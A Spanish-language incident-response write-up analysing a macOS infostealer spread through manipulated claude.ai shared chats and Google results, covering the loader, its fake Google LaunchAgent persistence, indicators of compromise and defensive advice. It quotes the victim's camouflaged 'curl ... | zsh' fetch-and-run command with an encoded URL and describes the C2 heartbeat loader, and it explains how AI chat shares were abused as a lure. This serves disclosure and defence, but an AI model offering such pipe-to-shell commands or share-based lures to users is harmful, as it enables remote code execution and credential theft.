---
titulo: "De una búsqueda de 'cómo instalar Claude Code' a un compromiso de 6 días: anatomía de un caso real"
descripcion: "Análisis de un incidente real en macOS: un infostealer distribuido via share links de claude.ai y Google Ads, con 8.640 heartbeats al C2 sin detección."
fecha: 2026-05-14
tags: ["incident-response", "macos", "infostealer", "dfir", "crowdstrike", "mitre"]
linkedin: "https://www.linkedin.com/in/angelmartinperdomo/"
destacado: true
---

Hoy me tocó investigar un incidente que me dejó pensando. Quiero compartirlo porque ilustra una clase de ataque que vamos a ver más seguido, y porque el vector real terminó siendo bastante distinto al que asumí al principio.

El punto de partida fue la sospecha de compromiso de un equipo: se me solicitó instalar CrowdStrike en el mismo. A los pocos minutos de haberlo desplegado, comenzaron las alertas. Una alerta de severidad alta, técnica MITRE **T1059.004** (Unix Shell): un proceso bash ejecutando un archivo desde una ruta sospechosa. El comando exacto:

```bash
/bin/bash /Users/[usuario]/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate
```

Lo que llamó la atención: la ruta. "GoogleUpdate" instalado en Application Support es atípico — el updater real de Chrome vive en otra ubicación, y además es un binario compilado, no un script.

## El stager

Al inspeccionar el archivo encontré un script bash de 750 bytes. Sin firmar, creado el 8 de mayo, 6 días antes de la detección. Su lógica era simple y elegante en el peor sentido:

1. Identifica el host con `IOPlatformUUID`, hostname, IP pública y versión de macOS.
2. Hace un POST a `https://babulikinet[.]com/api/bot/heartbeat` con esos datos.
3. Recibe del C2 un payload codificado en Base64.
4. Lo decodifica, lo escribe en `/tmp/.c.sh`, lo ejecuta, y lo borra.

La parte interesante: el script no hace nada malicioso por sí solo. Es solo un loader. Toda la lógica de robo, exfiltración o persistencia adicional vive en el payload que el C2 entrega en cada heartbeat. Esto tiene dos consecuencias importantes:

- Es muy difícil dimensionar exactamente qué hizo el atacante, porque cada payload se ejecutaba y se borraba.
- Cada ejecución es una nueva oportunidad de recibir instrucciones distintas. Si el atacante decidía hoy robar cookies de sesión y mañana exfiltrar archivos, podía hacerlo sin tocar el archivo persistente en disco.

## La persistencia

Un LaunchAgent en `~/Library/LaunchAgents/com.google.keystone.agent.plist` con `StartInterval=60` y `RunAtLoad=true`. Es decir, el stager se ejecutaba cada 60 segundos y al iniciar sesión del usuario.

Detalle deliberado: el nombre `com.google.keystone.agent` es idéntico al nombre del LaunchAgent legítimo heredado de Google (Keystone). Suplantación pensada para que cualquiera que listara los LaunchAgents y viera ese nombre asuma que es de Google y siga de largo.

**60 segundos × 6 días ≈ 8.640 heartbeats al C2. 8.640 oportunidades para el atacante de mandar payloads distintos.**

## El vector

Hasta acá tenía el *qué*. Faltaba el *cómo entró*.

El `.zsh_history` del usuario tenía esta línea:

```bash
echo "Downloading Update: https://support.apple.com/downloads/macos-security-update-14.5.dmg" && curl -s $(echo "[BASE64]" | base64 -d) | zsh
```

El `echo` es puro camuflaje: muestra al usuario una URL que evoca legitimidad de Apple pero no hace nada con ella. La acción real está en el `curl ... | zsh`, donde la URL del payload está codificada en Base64 para evadir cualquier filtro que busque dominios sospechosos.

Al decodificar el Base64: `https://babulikinet[.]com/debug/loader.sh?build=...`

Mi primera hipótesis fue ClickFix clásico: alguna página fake de captcha o de "actualización de seguridad" que convenció al usuario de pegar el comando. Le pregunté de dónde lo había sacado.

Y acá se puso interesante.

## El vector real

La respuesta me sorprendió. No fue un captcha falso. Lo que pasó fue esto:

1. El usuario buscó en Google **"cómo instalar Claude Code"** mientras estaba en una reunión.
2. El primer resultado era un share link público de `claude.ai` — la funcionalidad oficial de Anthropic para compartir conversaciones.
3. El usuario abrió el link, vio una conversación que parecía una guía de instalación legítima, confió porque la URL era `claude.ai`, y copió-pegó el comando sin verificación adicional.

El share link es real. La URL pertenece al dominio oficial de Anthropic. Lo que está manipulado es el contenido de la conversación, construido por el atacante mediante manipulación del prompt y luego compartido como link público.

Dos capas de validación de confianza apuntando al mismo contenido malicioso:

- Posicionamiento en los primeros resultados de Google.
- URL del dominio oficial de Anthropic.

Bajo esas circunstancias, el cuidado normal de un usuario razonable no alcanza para detectar el engaño. Y eso es lo que hace este vector particularmente interesante.

## La conexión

Una vez que el usuario me confirmó el origen del comando, encontré similitudes con una modalidad reportada cuatro días antes del incidente:

> [Hackers abuse Google Ads, Claude.ai chats to push Mac malware — BleepingComputer](https://www.bleepingcomputer.com/news/security/hackers-abuse-google-ads-claudeai-chats-to-push-mac-malware/)

La campaña abusa de Google Ads, SEO orgánico y shared chats de `claude.ai` para distribuir infostealers en macOS. El artículo documenta variantes con infraestructura en `customroofingcontractors[.]com`, `briskinternet[.]com` y `bernasibutuwqu2[.]com`.

La variante del caso que investigué utiliza un dominio C2 distinto y un identificador interno de campaña que no aparecen en la cobertura pública. Es decir: la campaña es más amplia que las muestras documentadas, y probablemente hay variantes adicionales en circulación.

## IOCs

```
Dominio C2:    babulikinet[.]com
SHA256:        690b856efcbcd1981c63acbad1fda548069965e4ee473c04ebcd9a226a6ae6fa
Build name:    eskalogs2
Bundle:        ~/Library/Application Support/Google/GoogleUpdate.app/
LaunchAgent:   ~/Library/LaunchAgents/com.google.keystone.agent.plist
```

## Lo que me dejó este caso

**La superficie de confianza se está expandiendo.** Tradicionalmente decíamos "cuidado con las URLs sospechosas". Hoy hay que decir además: cuidado con el *contenido* publicado bajo URLs legítimas. Cualquier plataforma que permita publicar contenido bajo su dominio (claude.ai shares, ChatGPT shares, Google Docs públicos, Notion públicos, GitHub Gists) puede ser vehículo de distribución de phishing técnico. Y el SEO funciona para ellos: dominios de autoridad alta como `claude.ai` posicionan rápido para queries técnicas.

**Los asistentes de IA pueden ser amplificadores involuntarios.** Un patrón circular: el LLM busca información → encuentra un share en su propio dominio → lo cita con autoridad → el usuario confía por la doble validación. Cualquier atacante puede replicar esto hoy mismo cambiando solo el dominio C2.

**El contexto del usuario importa más de lo que pensamos.** El usuario afectado es alguien técnico, con criterio. Pero estaba en una reunión, haciendo dos cosas a la vez. Y el ataque está diseñado exactamente para ese momento.

**Reglas que me parecen útiles:**

- Para instalar cualquier herramienta, ir directo a la documentación oficial escribiendo la URL a mano. No al primer resultado de Google. No a una conversación de IA compartida, aunque la URL sea del dominio oficial.
- Las funcionalidades de "compartir" de plataformas SaaS son contenido user-generated. El dominio es legítimo, el contenido no necesariamente.
- Antes de pegar cualquier comando en terminal, salí del multitasking por 30 segundos. La atención plena vale más que la rapidez.

El incidente me dejó con la sensación de que esta clase de vector — phishing técnico con plataformas de IA como amplificadores — recién está empezando.
